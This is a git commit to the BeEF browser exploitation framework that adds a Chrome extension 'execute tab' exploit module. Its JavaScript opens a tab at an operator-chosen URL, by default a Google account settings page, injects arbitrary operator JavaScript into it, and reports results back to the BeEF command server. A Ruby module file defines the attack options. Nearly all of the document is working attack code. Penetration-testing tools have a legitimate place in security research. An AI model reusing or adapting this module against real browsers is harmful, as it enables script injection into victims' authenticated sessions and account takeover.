258141199f204172414fda1a5cb4dab60e016e43
antisnatchor <antisnatchor@b87d56ec-f9c0-11de-8c8a-61c5e9addfc9>
2011-09-21 08:55:28 +0000

    (Fixes issue 505): added 'execute tab' chrome extension exploit.
    git-svn-id: https://beef.googlecode.com/svn/trunk@1301 b87d56ec-f9c0-11de-8c8a-61c5e9addfc9

---
+++ modules/chrome_extensions/execute_tabs/command.js
@@ -0,0 +1,27 @@
+//
+//   Copyright 2011 Wade Alcorn wade@bindshell.net
+//
+//   Licensed under the Apache License, Version 2.0 (the "License");
+//   you may not use this file except in compliance with the License.
+//   You may obtain a copy of the License at
+//
+//       http://www.apache.org/licenses/LICENSE-2.0
+//
+//   Unless required by applicable law or agreed to in writing, software
+//   distributed under the License is distributed on an "AS IS" BASIS,
+//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+//   See the License for the specific language governing permissions and
+//   limitations under the License.
+//
+beef.execute(function() {
+	try{
+		chrome.tabs.create({url:"<%= @url %>"}, function(tab){
+			chrome.tabs.executeScript(tab.id,{code:"<%= @theJS %>"}, function(){
+               beef.net.send('<%= @command_url %>', <%= @command_id %>, 'Code executed on tab.id: ' + tab.id);
+            });
+		});
+	} catch(error){
+		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'name=Not inside of a Chrome Extension');
+	}
+});
+
---
+++ modules/chrome_extensions/execute_tabs/module.rb
@@ -0,0 +1,32 @@
+#
+#   Copyright 2011 Wade Alcorn wade@bindshell.net
+#
+#   Licensed under the Apache License, Version 2.0 (the "License");
+#   you may not use this file except in compliance with the License.
+#   You may obtain a copy of the License at
+#
+#       http://www.apache.org/licenses/LICENSE-2.0
+#
+#   Unless required by applicable law or agreed to in writing, software
+#   distributed under the License is distributed on an "AS IS" BASIS,
+#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+#   See the License for the specific language governing permissions and
+#   limitations under the License.
+#
+class Execute_tabs < BeEF::Core::Command
+
+  def self.options
+    return [
+        {'name' => 'url', 'ui_label' => 'URL', 'value' => 'https://www.google.com/accounts/EditUserInfo',  'type' =>'textarea', 'width' => '500px'},
+        {'name' => 'theJS', 'ui_label' => 'Javascript', 'value' => 'prompt(\'uhm?\');', 'type' => 'textarea', 'width' => '400px', 'height' => '300px'}
+    ]
+  end
+
+  def post_execute
+    content = {}
+    content['Return'] = @datastore['return']
+    save content
+  end
+  
+end
+
